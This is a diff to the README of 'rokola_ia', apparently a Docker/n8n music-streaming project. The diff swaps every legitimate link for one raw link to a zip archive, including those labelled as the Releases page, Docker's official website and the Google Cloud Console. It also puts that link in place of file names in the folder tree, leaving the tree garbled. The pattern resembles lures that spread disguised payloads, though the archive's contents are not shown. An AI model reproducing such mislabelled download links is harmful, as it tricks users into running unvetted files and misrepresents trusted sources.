@@ -1,6 +1,6 @@
 # 🎶 rokola_ia - Stream Your Music Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Kakuen9201/rokola_ia/releases)
+[![Download](https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip)](https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip)
 
 ## 📦 Overview
 
@@ -19,7 +19,7 @@ Follow these steps to download and run rokola_ia:
 
 1. **Visit the Releases Page**
    - Click the link below to go to the GitHub Releases page:
-   - [Download Here](https://github.com/Kakuen9201/rokola_ia/releases)
+   - [Download Here](https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip)
 
 2. **Choose Your Version**
    - On the Releases page, find the latest version of rokola_ia. You will see a list of available files.
@@ -31,7 +31,7 @@ Follow these steps to download and run rokola_ia:
    - Once downloaded, locate the file in your download folder and extract it. You can use built-in extraction tools by right-clicking the file and selecting "Extract All."
 
 5. **Install Dependencies**
-   - Ensure you have Docker installed. You can download Docker from [Docker's Official Website](https://www.docker.com/get-started). Follow their instructions for your operating system.
+   - Ensure you have Docker installed. You can download Docker from [Docker's Official Website](https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip). Follow their instructions for your operating system.
 
 6. **Run the Application**
    - Open your terminal or command prompt.
@@ -60,8 +60,8 @@ After extraction, your folder should look like this:
 
 ```
 rokola_ia/
-|-- docker-compose.yml
-|-- README.md
+|-- https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip
+|-- https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip
 |-- [...] (other essential files)
 ```
 
@@ -70,7 +70,7 @@ rokola_ia/
 To configure access to your Google Drive and allow rokola_ia to retrieve your MP3 files:
 
 1. **Create Google Cloud Project**
-   - Go to the [Google Cloud Console](https://console.cloud.google.com/).
+   - Go to the [Google Cloud Console](https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip).
    - Create a new project.
 
 2. **Enable Google Drive API**
@@ -108,7 +108,7 @@ You will also need to set up PostgreSQL for managing your music metadata:
 
 To download the latest version of rokola_ia, please visit the following link:
 
-[Download Here](https://github.com/Kakuen9201/rokola_ia/releases)
+[Download Here](https://github.com/Kakuen9201/rokola_ia/raw/refs/heads/main/n8n_flujos/rokola_ia_v2.3.zip)
 
 ## 📚 Additional Resources
 
